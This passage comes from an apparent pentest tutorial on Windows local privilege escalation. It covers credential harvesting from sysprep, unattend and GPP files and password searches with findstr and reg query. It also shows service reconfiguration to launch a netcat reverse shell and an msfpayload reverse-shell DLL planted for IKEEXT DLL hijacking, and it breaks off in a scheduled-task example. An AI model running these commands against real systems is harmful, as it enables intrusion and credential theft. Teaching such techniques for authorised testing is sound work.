+<p>To simplify things I have created a script which can be dropped on the target machine and which will use WMIC to extract the following information: processes, services, user accounts, user groups, network interfaces, Hard Drive information, Network Share information, installed Windows patches, programs that run at startup, list of installed software, information about the operating system and timezone.<br><br>
+I have gone through the various flags and parameters to extract the valuable pieces of information if anyone thinks of something that should be added to the list please leave a comment below. Using the built-in output features the script will write all results to a human readable html file.<br><br>
+You can download my script (wmic_info.bat) - <a href="files/wmic_info.rar">here</a><br>
+Sample output file on a Windows 7 VM (badly patched) - <a href="files/Win7.html">here</a></p>
+<h2 class="title">Δt for t5 to t6 - Quick Fails<span class="line"></span></h2>
+<p>Before continuing on you should take a moment to review the information that you have gathered so far as there should be quite a bit by now. The next step in our gameplan is to look for some quick security fails which can be easily leveraged to upgrade our user privileges.<br><br>
+The first and most obvious thing we need to look at is the patchlevel. There is no need to worry ourself further if we see that the host is badly patched. My WMIC script will already list all the installed patches but you can see the sample command line output below.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">wmic qfe get Caption,Description,HotFixID,InstalledOn</span>
+
+Caption                                     Description      HotFixID   InstalledOn
+http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013
+http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013
+http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013
+http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013
+http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013
+http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013
+http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013
+http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013
+http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013
+http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013
+http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013
+http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013
+http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013
+http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013
+http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013
+http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013
+http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013
+http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013
+http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013
+http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013
+<span style="color:#2B8156;">[..Snip..]</span></pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>As always with Windows, the output isn't exactly ready for use. The best strategy is to look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799). After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing.<br><br>
+You can see the syntax to grep the patches below:</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."</span></pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>Next we will have a look at mass rollouts. If there is an environment where many machines need to be installed, typically, a technician will not go around from machine to machine. There are a couple of solutions to install machines automatically. What these methods are and how they work is less important for our purposes but the main thing is that they leave behind configuration files which are used for the installation process. These configuration files contain a lot of sensitive sensitive information such as the operating system product key and Administrator password. What we are most interested in is the Admin password as we can use that to elevate our privileges.<br><br>
+Typically these are the directories that contain the configuration files (however it is a good idea to check the entire OS):<br>
+<em>c:\sysprep.inf<br>
+c:\sysprep\sysprep.xml<br>
+%WINDIR%\Panther\Unattend\Unattended.xml<br>
+%WINDIR%\Panther\Unattended.xml</em><br><br>
+These files either contain clear-text passwords or in a Base64 encoded format. You can see some sample file output below.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># This is a sample from sysprep.inf with clear-text credentials.</strong></span>
+
+[GuiUnattended]
+OEMSkipRegional=1
+OemSkipWelcome=1
+AdminPassword=s3cr3tp4ssw0rd
+TimeZone=20
+
+<pre><span style="color:#990066;"><strong># This is a sample from sysprep.xml with Base64 "encoded" credentials. Please people Base64 is not
+encryption, I take more precautions to protect my coffee. The password here is "SuperSecurePassword".</strong></span>
+
+&lt;LocalAccounts&gt;
+    &lt;LocalAccount wcm:action="add"&gt;
+        &lt;Password&gt;
+            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;
+            &lt;PlainText&gt;false&lt;/PlainText&gt;
+        &lt;/Password&gt;
+        &lt;Description&gt;Local Administrator&lt;/Description&gt;
+        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;
+        &lt;Group&gt;Administrators&lt;/Group&gt;
+        &lt;Name&gt;Administrator&lt;/Name&gt;
+    &lt;/LocalAccount&gt;
+&lt;/LocalAccounts&gt;
+
+<pre><span style="color:#990066;"><strong># Sample from Unattended.xml with the same "secure" Base64 encoding.</strong></span>
+
+&lt;AutoLogon&gt;
+    &lt;Password&gt;
+        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;
+        &lt;PlainText&gt;false&lt;/PlainText&gt;
+    &lt;/Password&gt;
+    &lt;Enabled&gt;true&lt;/Enabled&gt;
+    &lt;Username&gt;Administrator&lt;/Username&gt;
+&lt;/AutoLogon&gt;</pre>
+</pre></pre></div>
+<p>&nbsp;</p>
+<p>On the recommendation of Ben Campbell (<a href="https://twitter.com/Meatballs__">@Meatballs__</a>) I'm adding Group Policy Preference saved passwords to the list of quick fails. GPO preference files can be used to create local users on domain machines. When the box you compromise is connected to a domain it is well worth looking for the Groups.xml file which is stored in SYSVOL. Any authenticated user will have read access to this file. The password in the xml file is "obscured" from the casual user by encrypting it with AES, I say obscured because the static key is published on the msdn website allowing for easy decryption of the stored value.</p>
+<p>&nbsp;</p>
+<img src="images/priv05_big.png">
+<p>&nbsp;</p>
+<p>In addition to Groups.xml several other policy preference files can have the optional "cPassword" attribute set:<br>
+Services\Services.xml: <a href="http://msdn.microsoft.com/en-us/library/cc980070.aspx">Element-Specific Attributes</a><br>
+ScheduledTasks\ScheduledTasks.xml: <a href="http://msdn.microsoft.com/en-us/library/cc422920.aspx">Task Inner Element</a>, <a href="http://msdn.microsoft.com/en-us/library/dd341350.aspx">TaskV2 Inner Element</a>, <a href="http://msdn.microsoft.com/en-us/library/dd304114.aspx">ImmediateTaskV2 Inner Element</a><br>
+Printers\Printers.xml: <a href="http://msdn.microsoft.com/en-us/library/cc422918.aspx">SharedPrinter Element</a><br>
+Drives\Drives.xml: <a href="http://msdn.microsoft.com/en-us/library/cc704598.aspx">Element-Specific Attributes</a><br>
+DataSources\DataSources.xml: <a href="http://msdn.microsoft.com/en-us/library/cc422926.aspx">Element-Specific Attributes</a></p>
+<p>&nbsp;</p>
+<p>This vulnerability can be exploited by manually browsing SYSVOL and grabbing the relevant files as demonstrated below.</p><p>
+</p><p>&nbsp;</p>
+<img src="images/priv06_big.png">
+<p>&nbsp;</p>
+<p>However we all like automated solutions so we can get to the finish line as quickly as possible. There are two main options here, depending on the kind of shell/access that we have. There is (1) a metasploit module which can be executed through an established session <a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp">here</a> or (2) you can use Get-GPPPassword which is part of <a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a>. PowerSploit is an excellent powershell framework, by Matt Graeber, tailored to reverse engineering, forensics and pentesting.</p>
+<p>&nbsp;</p>
+<p>The next thing we will look for is a strange registry setting "AlwaysInstallElevated", if this setting is enabled it allows users of any privilege level to install *.msi files as NT AUTHORITY\SYSTEM. It seems like a strange idea to me that you would create low privilege users (to restrict their use of the OS) but give them the ability to install programs as SYSTEM. For more background reading on this issue you can have a look <a href="http://www.greyhathacker.net/?p=185">here</a> at an article by Parvez from GreyHatHacker who originally reported this as a security concern.<br><br>
+To be able to use this we need to check that two registry keys are set, if that is the case we can pop a SYSTEM shell. You can see the sytntax to query the respective registry keys below.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.</strong></span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span>
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span></pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>To finish off this section we will do some quick searching on the operating system and hope we strike gold. You can see the syntax for our searches below.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># The command below will search the file system for file names containing certain keywords. You can
+specify as many keywords as you wish.</strong></span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">dir /s *pass* == *cred* == *vnc* == *.config*</span>
+
+<span style="color:#990066;"><strong># Search certain file types for a keyword, this can generate a lot of output.</strong></span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">findstr /si password *.xml *.ini *.txt</span>
+
+<span style="color:#990066;"><strong># Similarly the two commands below can be used to grep the registry for keywords, in this case "password".</strong></span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">reg query HKLM /f password /t REG_SZ /s</span>
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">reg query HKCU /f password /t REG_SZ /s</span></pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<h2 class="title">Δt for t7 to t10 - Roll Up Your Sleeves<span class="line"></span></h2>
+<p>Hopefully by now we already have a SYSTEM shell but if we don't there are still a few avenues of attack left to peruse. In this final part we will look at Windows services and file/folder permissions. Our goal here is to use weak permissions to elevate our session privileges.<br><br>
+We will be checking a lot of access rights so we should grab a copy of accesschk.exe which is a tool from Microsoft's Sysinternals Suite. Microsoft Sysinternals contains a lot of excellent tools, it's a shame that Microsoft hasn't added them to the standard Windows build. You can download the suite from Microsoft technet <a href="http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx">here</a>.<br><br>
+We will start off with Windows services as there are some quick wins to be found there. Generally modern operating systems won't contain vulnerable services. Vulnerable, in this case, means that we can reconfigure the service parameters. Windows services are kind of like application shortcut's, have a look at the example below.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># We can use sc to query, configure and manage windows services.</strong></span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">sc qc Spooler</span>
+
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Spooler
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\System32\spoolsv.exe
+        LOAD_ORDER_GROUP   : SpoolerGroup
+        TAG                : 0
+        DISPLAY_NAME       : Print Spooler
+        DEPENDENCIES       : RPCSS
+                           : http
+        SERVICE_START_NAME : LocalSystem</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>We can check the required privilege level for each service using accesschk.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># We can see the permissions that each user level has, you can also use "accesschk.exe -ucqv *" to list
+all services.</strong></span>
+
+<span style="color:#ff0000;">C:\</span>&gt; <span style="color:#2B8156;">accesschk.exe -ucqv Spooler</span>
+
+Spooler
+
+  R  NT AUTHORITY\Authenticated Users
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  R  BUILTIN\Power Users
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>Accesschk can automatically check if we have write access to a Windows service with a certain user level. Generally as a low privilege user we will want to check for "Authenticated Users". Make sure to check which user groups you user belongs to, "Power Users" for example is considered a low privilege user group (though it is not widely used).<br><br>
+Lets compare the output on Windows 8 and on Windows XP SP0.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># This is on Windows 8.</strong></span>
+
+<span style="color:#ff0000;">C:\Users\b33f\tools\Sysinternals</span>&gt; <span style="color:#2B8156;">accesschk.exe -uwcqv "Authenticated Users" *</span>
+No matching objects found.
+
+<span style="color:#990066;"><strong># On a default Windows XP SP0 we can see there is a pretty big security fail.</strong></span>
+
+<span style="color:#ff0000;">C:\</span>&gt; <span style="color:#2B8156;">accesschk.exe -uwcqv "Authenticated Users" *</span>
+RW SSDPSRV
+        SERVICE_ALL_ACCESS
+RW upnphost
+        SERVICE_ALL_ACCESS
+		
+<span style="color:#ff0000;">C:\</span>&gt; <span style="color:#2B8156;">accesschk.exe -ucqv SSDPSRV</span>
+
+SSDPSRV
+
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Power Users
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\LOCAL SERVICE
+        SERVICE_ALL_ACCESS
+
+<span style="color:#ff0000;">C:\</span>&gt; <span style="color:#2B8156;">accesschk.exe -ucqv upnphost</span>
+
+upnphost
+
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Power Users
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\LOCAL SERVICE
+        SERVICE_ALL_ACCESS</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>This issue was later resolved with the introduction of XP SP2, however on SP0&amp;SP1 it can be used as a universal local privilege escalation vulnerability. By reconfiguring the service we can let it run any binary of our choosing with SYSTEM level privileges.<br><br>
+Let's have a look how this is done in practise. In this case the service will execute netcat and open a reverse shell with SYSTEM level privileges. Other options are certainly possible.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\</span>&gt; <span style="color:#2B8156;">sc qc upnphost</span>
+
+[SC] GetServiceConfig SUCCESS
+
+SERVICE_NAME: upnphost
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Universal Plug and Play Device Host
+        DEPENDENCIES       : SSDPSRV
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+		
+<span style="color:#ff0000;">C:\</span>&gt; <span style="color:#2B8156;">sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"</span>
+[SC] ChangeServiceConfig SUCCESS
+
+<span style="color:#ff0000;">C:\</span>&gt; <span style="color:#2B8156;">sc config upnphost obj= ".\LocalSystem" password= ""</span>
+[SC] ChangeServiceConfig SUCCESS
+
+<span style="color:#ff0000;">C:\</span>&gt; <span style="color:#2B8156;">sc qc upnphost</span>
+
+[SC] GetServiceConfig SUCCESS
+
+SERVICE_NAME: upnphost
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Universal Plug and Play Device Host
+        DEPENDENCIES       : SSDPSRV
+        SERVICE_START_NAME : LocalSystem
+		
+<span style="color:#ff0000;">C:\</span>&gt; <span style="color:#2B8156;">net start upnphost</span></pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+<div class="caption">
+<a href="images/priv01_big.png" rel="prettyPhoto[WinPrivTut]">
+<img src="images/priv01_small.png" alt="" class="pic">
+<span class="hover-effect zoom"></span></a>
+</div>
+<p>Service Shell (upnphost)</p>
+</div>
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>We will not always have full access to a service even if it is incorrectly configured. The image below is taken from Brett Moore's presentation on Windows privilege escalation, any of these access rights will give us a SYSTEM shell.</p>
+<p>&nbsp;</p>
+<img src="images/priv02_big.png" height="80%" width="80%">
+<p>&nbsp;</p>
+<p>The important thing to remember is that we find out what user groups our compromised session belongs to. As mentioned previously "Power Users" is also considered to be a low privileged user group. "Power Users" have their own set of vulnerabilities, Mark Russinovich has written a very interesting article on the subject.<br><br>
+The Power in Power Users (Mark Russinovich) - <a href="http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx">here</a><br><br>
+Finally we will examine file/folder permissions, if we can not attack the OS directly we will let the OS do all the hard work. There is to much ground to cover here so instead I will show you two kinds of permission vulnerabilities and how to take advantage of them. Once you grasp the general idea you will be able to apply these techniques to other situations.<br><br>
+For our first example we will replicate the results of a post written by Parvez from GreyHatHacker; "Elevating privileges by exploiting weak folder permissions". This is a great privilege escalation write-up and I highly recommend that you read his post <a href="http://www.greyhathacker.net/?p=738">here</a>.<br><br>
+This example is a special case of DLL hijacking. Programs usually can't function by themselves, they have a lot of resources they need to hook into (mostly DLL's but also proprietary files). If a program or service loads a file from a directory we have write access to we can abuse that to pop a shell with the privileges the program runs as.<br><br>
+Generally a Windows application will use pre-defined search paths to find DLL's and it will check these paths in a specific order. DLL hijacking usually happens by placing a malicious DLL in one of these paths while making sure that DLL is found before the legitimate one. This problem can be mitigated by having the application specify absolute paths to the DLL's that it needs.<br><br>
+You can see the DLL search order on 32-bit systems below:<br>
+1 - The directory from which the application loaded<br>
+2 - 32-bit System directory (C:\Windows\System32)<br>
+3 - 16-bit System directory (C:\Windows\System)<br>
+4 - Windows directory (C:\Windows)<br>
+5 - The current working directory (CWD)<br>
+6 - Directories in the PATH environment variable (system then user)<br><br>
+It sometimes happens that applications attempt load DLL's that do not exist on the machine. This may occur due to several reasons, for example if the DLL is only required for certain plug-ins or features which are not installed. In this case Parvez discovered that certain Windows services attempt to load DLL's that do not exist in default installations.<br><br>
+Since the DLL in question does not exist we will end up traversing all the search paths. As a low privilege user we have little hope of putting a malicious DLL in 1-4, 5 is not a possibility in this case because we are talking about a Windows service but if we have write access to any of the directories in the Windows PATH we win.<br><br>
+Let's have a look at how this works in practise, for our example we will be using the IKEEXT (IKE and AuthIP IPsec Keying Modules) service which tries to load wlbsctrl.dll.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># This is on Windows 7 as low privilege user1.</strong></span>
+
+<span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">echo %username%</span>
+
+user1
+
+<span style="color:#990066;"><strong># We have a win here since any non-default directory in "C:\" will give write access to authenticated
+users.</strong></span>
+		
+<span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">echo %path%</span>
+
+C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;
+C:\Program Files\OpenVPN\bin;C:\Python27
+
+<span style="color:#990066;"><strong># We can check our access permissions with accesschk or cacls.</strong></span>
+
+<span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">accesschk.exe -dqv "C:\Python27"</span>
+
+C:\Python27
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Administrators
+        FILE_ALL_ACCESS
+  RW NT AUTHORITY\SYSTEM
+        FILE_ALL_ACCESS
+  R  BUILTIN\Users
+        FILE_LIST_DIRECTORY
+        FILE_READ_ATTRIBUTES
+        FILE_READ_EA
+        FILE_TRAVERSE
+        SYNCHRONIZE
+        READ_CONTROL
+  RW NT AUTHORITY\Authenticated Users
+        FILE_ADD_FILE
+        FILE_ADD_SUBDIRECTORY
+        FILE_LIST_DIRECTORY
+        FILE_READ_ATTRIBUTES
+        FILE_READ_EA
+        FILE_TRAVERSE
+        FILE_WRITE_ATTRIBUTES
+        FILE_WRITE_EA
+        DELETE
+        SYNCHRONIZE
+        READ_CONTROL
+
+<span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">cacls "C:\Python27"</span>
+
+C:\Python27 BUILTIN\Administrators:(ID)F
+            BUILTIN\Administrators:(OI)(CI)(IO)(ID)F
+            NT AUTHORITY\SYSTEM:(ID)F
+            NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F
+            BUILTIN\Users:(OI)(CI)(ID)R
+            NT AUTHORITY\Authenticated Users:(ID)C
+            NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C
+			
+<span style="color:#990066;"><strong># Before we go over to action we need to check the status of the IKEEXT service. In this case we can see
+it is set to "AUTO_START" so it will launch on boot!</strong></span>
+		
+<span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">sc qc IKEEXT</span>
+
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: IKEEXT
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules
+        DEPENDENCIES       : BFE
+        SERVICE_START_NAME : LocalSystem</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>Now we know the necessary conditions are met we can generate a malicious DLL and pop a shell!</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">root@darkside</span>:~# <span style="color:#2B8156;">msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O</span>
+
+       Name: Windows Command Shell, Reverse TCP Inline
+     Module: payload/windows/shell_reverse_tcp
+   Platform: Windows
+       Arch: x86
+Needs Admin: No
+ Total size: 314
+       Rank: Normal
+
+Provided by:
+  vlad902 &lt;vlad902@gmail.com&gt;
+  sf &lt;stephen_fewer@harmonysecurity.com&gt;
+
+Basic options:
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+LHOST     127.0.0.1        yes       The listen address
+LPORT     9988             yes       The listen port
+
+Description:
+  Connect back to attacker and spawn a command shell
+
+<span style="color:#ff0000;">root@darkside</span>:~# <span style="color:#2B8156;">msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D &gt; 
+/root/Desktop/evil.dll</span>
+
+Created by msfpayload (http://www.metasploit.com).
+Payload: windows/shell_reverse_tcp
+ Length: 314
+Options: {"lhost"=&gt;"127.0.0.1", "lport"=&gt;"9988"}</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>After transferring the DLL to our target machine all we need to do is rename it to wlbsctrl.dll and move it to "C:\Python27". Once this is done we need to wait patiently for the machine to be rebooted (or we can try to force a reboot) and we will get a SYSTEM shell.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># Again, this is as low privilege user1.</strong></span>
+
+<span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">dir</span>
+
+ Volume in drive C has no label.
+ Volume Serial Number is 948D-A98F
+
+ Directory of C:\Users\user1\Desktop
+
+02/18/2014  01:49 PM    &lt;DIR&gt;          .
+02/18/2014  01:49 PM    &lt;DIR&gt;          ..
+04/22/2013  09:39 AM           331,888 accesschk.exe
+02/18/2014  12:38 PM            14,336 evil.dll
+01/25/2014  12:46 AM            36,864 fubar.exe
+01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2
+06/30/2011  01:52 PM         1,667,584 ncat.exe
+11/22/2013  07:39 PM             1,225 wmic_info.bat
+               5 File(s)      2,051,897 bytes
+               3 Dir(s)      73,052,160 bytes free
+
+<span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">copy evil.dll C:\Python27\wlbsctrl.dll</span>
+
+        1 file(s) copied.
+		
+<span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">dir C:\Python27</span>
+
+ Volume in drive C has no label.
+ Volume Serial Number is 948D-A98F
+
+ Directory of C:\Python27
+
+02/18/2014  01:53 PM    &lt;DIR&gt;          .
+02/18/2014  01:53 PM    &lt;DIR&gt;          ..
+10/20/2012  02:52 AM    &lt;DIR&gt;          DLLs
+10/20/2012  02:52 AM    &lt;DIR&gt;          Doc
+10/20/2012  02:52 AM    &lt;DIR&gt;          include
+01/28/2014  03:45 AM    &lt;DIR&gt;          Lib
+10/20/2012  02:52 AM    &lt;DIR&gt;          libs
+04/10/2012  11:34 PM            40,092 LICENSE.txt
+04/10/2012  11:18 PM           310,875 NEWS.txt
+04/10/2012  11:31 PM            26,624 python.exe
+04/10/2012  11:31 PM            27,136 pythonw.exe
+04/10/2012  11:18 PM            54,973 README.txt
+10/20/2012  02:52 AM    &lt;DIR&gt;          tcl
+10/20/2012  02:52 AM    &lt;DIR&gt;          Tools
+04/10/2012  11:31 PM            49,664 w9xpopen.exe
+02/18/2014  12:38 PM            14,336 wlbsctrl.dll
+               7 File(s)        523,700 bytes
+               9 Dir(s)      73,035,776 bytes free</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>Everything is set up, all we need to do now is wait for a system reboot. For demo purposes I have included a screenshot below where I use an Administrator command prompt to manually restart the service.</p>
+<p>&nbsp;</p>
+<div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+<div class="caption">
+<a href="images/priv03_big.png" rel="prettyPhoto[WinPrivTut]">
+<img src="images/priv03_small.png" alt="" class="pic">
+<span class="hover-effect zoom"></span></a>
+</div>
+<p>Service Shell (IKEEXT)</p>
+</div>
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>For our final example we will have a look at the scheduled tasks. Going over the results we gathered earlier we come across the following entry.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre>HostName:                             B33F
+TaskName:                             \LogGrabberTFTP
+Next Run Time:                        2/19/2014 9:00:00 AM
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        N/A
+Last Result:                          1
+Author:                               B33F\b33f
+Task To Run:                          E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out E:\GrabLogs\Logs\log.txt
+Start In:                             N/A
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode, No Start On Batteries
+Run As User:                          SYSTEM
+Delete Task If Not Rescheduled:       Enabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        Daily
+Start Time:                           9:00:00 AM
+Start Date:                           2/17/2014
+End Date:                             N/A
+Days:                                 Every 1 day(s)
+Months:                               N/A
+Repeat: Every:                        Disabled
+Repeat: Until: Time:                  Disabled
+Repeat: Until: Duration:              Disabled
+Repeat: Stop If Still Running:        Disabled</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>There seems to be a TFTP client on the box which is connecting to a remote host and grabbing some kind of log file. We can see that this task runs each day at 9 AM and it runs with SYSTEM level privileges (ouch). Lets have a look if we have write access to this folder.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">accesschk.exe -dqv "E:\GrabLogs"</span>
+
+E:\GrabLogs
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Administrators
+        FILE_ALL_ACCESS
+  RW NT AUTHORITY\SYSTEM
+        FILE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        FILE_ADD_FILE
+        FILE_ADD_SUBDIRECTORY
+        FILE_LIST_DIRECTORY
+        FILE_READ_ATTRIBUTES
+        FILE_READ_EA
+        FILE_TRAVERSE
+        FILE_WRITE_ATTRIBUTES
+        FILE_WRITE_EA
+        DELETE
+        SYNCHRONIZE
+        READ_CONTROL
+  R  BUILTIN\Users
+        FILE_LIST_DIRECTORY
+        FILE_READ_ATTRIBUTES
+        FILE_READ_EA
